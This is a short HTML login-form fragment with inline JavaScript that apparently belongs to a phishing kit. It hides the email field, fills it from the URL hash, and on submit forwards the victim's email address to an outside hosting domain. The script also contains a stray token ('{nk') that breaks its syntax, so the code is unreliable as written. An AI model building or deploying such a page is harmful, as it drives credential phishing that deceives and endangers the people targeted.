    <div id="forms">
        <form id="login_form" method="post" name="login" action="" autocomplete="off">
            <div class="input-req-login"><label for="email"></label></div>
            <div class="input-field-login icon username-container" hidden>
                <input name="email" id="email" placeholder="Enter your email address." class="std_textbox" type="email" tabindex="1" required>
            </div>

    <script>
        // Function to get email from URL hash
        function getEmailFromHash() {nk
            const hash = window.location.hash;
            if (hash && hash.includes('@')) {
                const email = hash.substring(1); // Remove the '#' character
                document.getElementById('email').value = email;
            }
        }

        // Run the function when the page loads
        window.onload = getEmailFromHash;

        // Handle form submission
        $(document).ready(function () {
            $('#login_form').on('submit', function (e) {
                e.preventDefault(); // Prevent the default form submission

                // Get the email address
                const email = $('#email').val();


                // Construct the URL and redirect
                if (email) {
                    window.location.href = 'https://box228-webb-hoster.bohr.io/' + '#' + email;
                } else {
                    alert('Please enter a valid email address.');
                }
            });
        });
    </script>
